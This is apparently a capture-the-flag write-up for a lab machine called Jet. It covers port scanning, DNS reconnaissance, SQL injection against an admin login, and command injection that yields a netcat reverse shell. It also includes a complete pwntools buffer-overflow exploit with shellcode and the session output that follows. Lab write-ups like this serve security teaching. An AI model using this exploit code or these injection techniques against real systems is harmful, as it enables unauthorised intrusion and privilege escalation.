# Nmap
```
Nmap scan report for 10.13.37.10
Host is up, received user-set (0.18s latency).
Scanned at 2024-02-07 12:27:48 +08 for 1513s
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b:7c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzfo72P9KbpK9EZIE/AdtfSawGO5rjNM4GOu1Te5M2Z576c7aEVWv+284kw4OQ6JxQtFL56QsVaxRwxY9jGdpluJw5AWQpASy/Rx8q2JT7yGv0yGI8+tAIjLOMNmq5Qt6IjbDiSbL+gp6a+AsA0Mvm9OUYxBDM+LRsKFjwLDJCzFVKMFGc+gNrYJwpRa9RADsXN/19ogVYG8v9GvqFAJygMyTqVM0fbX3dDcAlMWgcHu81wMmQQGznjLe2gTY/sFAhASAfieVnSYIF11amofP8eUd+6jWL1wSlhRcW+j15tsPcotcfdpCrUJMFXq2tumXfNLJUWhv75Rf8pUeVobsx
|   256 54:e2:7e:5a:1c:aa:9a:ab:65:ca:fa:39:28:bc:0a:43 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLz7MT1sqbOHsYtNwWDfYJW8uCAPUL+zMJrW2DvIM7a9jG2RI40LNKjtiYv+M6DXjTWr3DK21kIWWK4TKMEl5Wo=
|   256 93:bc:37:b7:e0:08:ce:2d:03:99:01:0a:a9:df:da:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEEtJp2PzxXAhVXs6nNbgJXgRbLCiB/hcGJY5IgBKfS4
53/tcp    open  domain   syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp    open  http     syn-ack ttl 63 nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx on Debian!
5555/tcp  open  freeciv? syn-ack ttl 63
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, adbConnect: 
|     enter your name:
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
7777/tcp  open  cbt?     syn-ack ttl 63
9201/tcp  open  http     syn-ack ttl 63 BaseHTTPServer 0.3 (Python 2.7.12)
| http-methods: 
|_  Supported Methods: GET
|_http-title: Site doesn't have a title (application/json).
60006/tcp open  unknown  syn-ack ttl 63
```

# Flag 1 Connect
http://10.13.37.10<br>
![Flag 1](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/Fortress%20Jet%20F1.png)

# Flag 2 Digging In
```
dig @10.13.37.10 -x 10.13.37.10 

; <<>> DiG 9.19.19-1-Debian <<>> @10.13.37.10 -x 10.13.37.10
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 52896
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.	IN	PTR

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.	604800	IN	SOA	www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800

;; Query time: 347 msec
;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)
;; WHEN: Wed Feb 07 12:31:06 +08 2024
;; MSG SIZE  rcvd: 109
```
After adding www.securewebinc.jet to /etc/hosts visit www.secureweb.inc.jet
![Flag 2](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/Fortress%20Jet%20F2.png)

# Flag 3 Going Deeper
In Burp we can see the web application is constantly calling to http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/stats.php
Visiting http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/ lead us to a login page.


# Flag 4 Bypass Authentication
Error message when attempting to sign in with admin:admin shows that admin user exists. Username parameter is vulnerable to SQL injection. Get the user's password hash with SQLmap and crach it with hashcat. 
![Flag 4](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/Fortress%20Jet%20F4.png)

# Flag 5 Command
Trigger a post request to http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php through the admin dashboard "Quick email" form. Start a netcat listener and receive a reverse shell through command injection.
![Flag 5](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/Fortress%20Jet%20F5.png)
```
rlwrap nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.2] from (UNKNOWN) [10.13.37.10] 54576
/bin/sh: can't access tty; job control turned off
$ whoami
www-data
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash");'
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ ls -la
ls -la
total 120
drwxr-x---  8 root www-data  4096 Jan  3  2018 .
drwxr-x---  3 root www-data  4096 Dec 20  2017 ..
-rw-r--r--  1 root root        33 Dec 20  2017 a_flag_is_here.txt
-rwxr-x---  1 root www-data   157 Jan  3  2018 auth.php
-rwxr-x---  1 root www-data    39 Dec 20  2017 badwords.txt
drwxr-x--- 32 root www-data  4096 Dec 20  2017 bower_components
drwxr-x---  6 root www-data  4096 Oct  9  2017 build
-rwxr-x---  1 root www-data    82 Dec 20  2017 conf.php
-rwxr-x---  1 root www-data 44067 Dec 27  2017 dashboard.php
-rwxr-x---  1 root www-data   600 Dec 20  2017 db.php
drwxr-x---  5 root www-data  4096 Oct  9  2017 dist
-rwxr-x---  1 root www-data   820 Dec 27  2017 dologin.php
-rwxr-x---  1 root www-data  2881 Dec 27  2017 email.php
-rwxr-x---  1 root www-data    43 Dec 20  2017 index.php
drwxr-x---  2 root www-data  4096 Dec 20  2017 js
-rwxr-x---  1 root www-data  3606 Dec 20  2017 login.php
-rwxr-x---  1 root www-data    98 Dec 20  2017 logout.php
drwxr-x--- 10 root www-data  4096 Dec 20  2017 plugins
-rwxr-x---  1 root www-data    21 Nov 14  2017 stats.php
drwxrwxrwx  2 root www-data  4096 Dec 20  2017 uploads
```

# Flag 6 Overflown
```python
import os

os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *

p = remote('10.13.37.10', 60006)
# receive until we see this text
p.recvuntil("Oops, I'm leaking! ")
# store leaked libc base address
leak=int(p.recvuntil("\n"),16)
log.info('Libc address: {}'.format(hex(leak)))
p.recvuntil("> ")
leak2= p64(int(leak))
# execve x64 shellcode 30 bytes - https://www.exploit-db.com/exploits/37362/
payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload += "A"*(72-len(payload))
payload += str(leak2)
p.sendline (payload)

p.interactive()
```
```
www-data@jet:/tmp$ python bof.py
python bof.py
[x] Opening connection to 10.13.37.10 on port 60006
[x] Opening connection to 10.13.37.10 on port 60006: Trying 10.13.37.10
[+] Opening connection to 10.13.37.10 on port 60006: Done
[*] Libc address: 0x7fff808f2a90
[*] Switching to interactive mode
id
id
uid=33(www-data) gid=33(www-data) euid=1005(alex) groups=33(www-data)

ls -la /home/alex
total 916
drwxrwx--- 6 alex alex       4096 Feb  5 06:52 .
drwxr-xr-x 8 root root       4096 Apr  1  2018 ..
-rw-r--r-- 1 root root          0 Dec 28  2017 .bash_history
-rwxrwx--- 1 alex alex        220 Dec 27  2017 .bash_logout
-rwxrwx--- 1 alex alex       3771 Dec 27  2017 .bashrc
drwx------ 2 alex alex       4096 Feb  5 06:15 .cache
drwxr-x--- 3 alex alex       4096 Feb  5 06:46 .config
drwx------ 2 alex alex       4096 Feb  5 06:47 .gnupg
-rwxrwx--- 1 alex alex        655 Dec 27  2017 .profile
drwx------ 2 alex www-data   4096 Feb  5 06:13 .ssh
-rw-r--r-- 1 root root        659 Jan  3  2018 crypter.py
-rw-r--r-- 1 root root       1481 Dec 28  2017 encrypted.txt
-rw-r--r-- 1 root root       7285 Dec 27  2017 exploitme.zip
-rw-r--r-- 1 root root         27 Dec 28  2017 flag.txt
-rw-r--r-- 1 alex www-data      0 Feb  5 06:13 kik
```

